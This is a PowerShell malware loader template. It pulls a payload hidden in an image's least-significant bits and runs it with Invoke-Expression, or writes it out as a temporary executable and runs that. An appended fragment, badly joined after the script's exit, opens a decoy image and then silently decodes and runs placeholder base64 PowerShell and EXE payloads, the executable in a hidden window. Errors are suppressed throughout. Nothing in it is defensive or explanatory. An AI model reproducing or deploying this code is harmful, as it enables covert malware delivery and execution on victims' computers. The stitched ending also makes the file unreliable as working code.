# ============================================================================
# LSB STEGANOGRAPHY EXTRACTOR - Clean payload extraction from images
# ============================================================================
# This script extracts hidden payloads from images using LSB steganography
# and executes them directly in memory
# 
# Usage:
#   1. Image is embedded as Base64 in this script (embedded at runtime)
#   2. Payload metadata is passed as parameters
#   3. Extracts LSB bits, reassembles data, executes payload
# ============================================================================

param(
    [byte[]]$ImageBytes,           # Base64-decoded image bytes
    [int]$PayloadSize = $null,     # Payload size in bytes (from metadata)
    [string]$Mode = "execute"      # "execute" or "extract" (for testing)
)

$ErrorActionPreference = "SilentlyContinue"

# ===== HELPER FUNCTIONS =====

function Write-Status {
    param([string]$Message, [string]$Type = "INFO")
    $timestamp = Get-Date -Format "HH:mm:ss"
    $prefix = switch($Type) {
        "SUCCESS" { "[+]" }
        "ERROR"   { "[-]" }
        "DEBUG"   { "[*]" }
        default   { "[*]" }
    }
    Write-Host "[$timestamp] $prefix $message" -ForegroundColor $(
        switch($Type) {
            "SUCCESS" { "Green" }
            "ERROR"   { "Red" }
            "DEBUG"   { "Cyan" }
            default   { "White" }
        }
    )
}

function Get-LSBData {
    param(
        [byte[]]$ImageData,
        [int]$DataSize
    )
    
    if ($DataSize -le 0) {
        Write-Status "Invalid data size" "ERROR"
        return $null
    }
    
    Write-Status "Extracting $DataSize bytes from image..."
    
    # Calculate how many bytes we need to read
    # 1 byte of data = 8 bits, and we get 1 bit per image byte
    $bitsNeeded = $DataSize * 8
    
    if ($ImageData.Length -lt $bitsNeeded) {
        Write-Status "Image too small for extraction (need $bitsNeeded bits, have $($ImageData.Length * 8))" "ERROR"
        return $null
    }
    
    # Extract LSB from each byte
    [byte[]]$extractedBits = @()
    for ($i = 0; $i -lt $bitsNeeded; $i++) {
        $bit = $ImageData[$i] -band 1
        $extractedBits += $bit
    }
    
    # Convert bit array to byte array
    [byte[]]$payload = @()
    for ($byteIdx = 0; $byteIdx -lt $DataSize; $byteIdx++) {
        [byte]$currentByte = 0
        for ($bitIdx = 0; $bitIdx -lt 8; $bitIdx++) {
            $bitPosition = $byteIdx * 8 + $bitIdx
            if ($bitPosition -lt $extractedBits.Count) {
                # Set bit position
                $currentByte = $currentByte -bor ($extractedBits[$bitPosition] -shl (7 - $bitIdx))
            }
        }
        $payload += $currentByte
    }
    
    Write-Status "Extraction complete! Got $($payload.Length) bytes" "SUCCESS"
    return $payload
}

function Invoke-ExtractedPayload {
    param([byte[]]$PayloadData)
    
    Write-Status "Preparing payload execution..."
    
    try {
        # Try to decode as text first (likely PowerShell script)
        $scriptText = [System.Text.Encoding]::UTF8.GetString($PayloadData)
        
        # Check if it looks like PowerShell
        if ($scriptText -match "^[#a-zA-Z0-9\$\(\)\[\]\{\}]") {
            Write-Status "Detected PowerShell script, executing..."
            Invoke-Expression $scriptText
        }
        else {
            # Try as executable (less likely in this context)
            Write-Status "Attempting binary execution..."
            $tempFile = [System.IO.Path]::GetTempFileName() + ".exe"
            [System.IO.File]::WriteAllBytes($tempFile, $PayloadData)
            & $tempFile
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
        
        Write-Status "Payload execution complete" "SUCCESS"
        return $true
    }
    catch {
        Write-Status "Execution error: $_" "ERROR"
        return $false
    }
}

# ===== MAIN EXECUTION =====

# Validate inputs
if ($null -eq $ImageBytes -or $ImageBytes.Count -eq 0) {
    Write-Status "No image data provided!" "ERROR"
    exit 1
}

if ($PayloadSize -eq 0 -or $null -eq $PayloadSize) {
    Write-Status "Payload size not specified!" "ERROR"
    exit 1
}

Write-Status "========================================" "DEBUG"
Write-Status "LSB Extractor Starting" "DEBUG"
Write-Status "========================================" "DEBUG"
Write-Status "Image size: $($ImageBytes.Count) bytes"
Write-Status "Payload size: $PayloadSize bytes"

# Extract payload
$payload = Get-LSBData -ImageData $ImageBytes -DataSize $PayloadSize

if ($null -eq $payload) {
    Write-Status "Failed to extract payload!" "ERROR"
    exit 1
}

# Execute or return
switch ($Mode.ToLower()) {
    "execute" {
        $result = Invoke-ExtractedPayload -PayloadData $payload
        exit $(if ($result) { 0 } else { 1 })
    }
    "extract" {
        # For debugging: return payload
        Write-Status "Debug mode: Returning payload"
        return $payload
    }
    default {
        Write-Status "Unknown mode: $Mode" "ERROR"
        exit 1
    }
}
    $imageBase64 = ""
    
    if ($imageBase64 -and $imageBase64 -ne "") {
        $imageBytes = [Convert]::FromBase64String($imageBase64)
        $imagePath = Join-Path $tempFolder ("img_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".jpg")
        [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
        
        # Open image
        Start-Process $imagePath
    }
}
catch { }

# ===== 2. EXECUTE HIDDEN POWERSHELL PAYLOAD =====
try {
    $payloadBase64 = "PLACE_YOUR_PAYLOAD_BASE64_HERE"
    
    if ($payloadBase64 -and $payloadBase64 -ne "PLACE_YOUR_PAYLOAD_BASE64_HERE") {
        $payloadBytes = [Convert]::FromBase64String($payloadBase64)
        $payload = [System.Text.Encoding]::UTF8.GetString($payloadBytes)
        Invoke-Expression $payload
    }
}
catch { }

# ===== 3. EXTRACT AND RUN HIDDEN EXECUTABLE =====
try {
    $exeBase64 = "PLACE_YOUR_EXE_BASE64_HERE"
    
    if ($exeBase64 -and $exeBase64 -ne "PLACE_YOUR_EXE_BASE64_HERE") {
        $exeBytes = [Convert]::FromBase64String($exeBase64)
        $exePath = Join-Path $tempFolder ("bin_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".exe")
        [System.IO.File]::WriteAllBytes($exePath, $exeBytes)
        
        # Run hidden
        Start-Process $exePath -WindowStyle Hidden
    }
}
catch { }

# Exit silently
exit 0
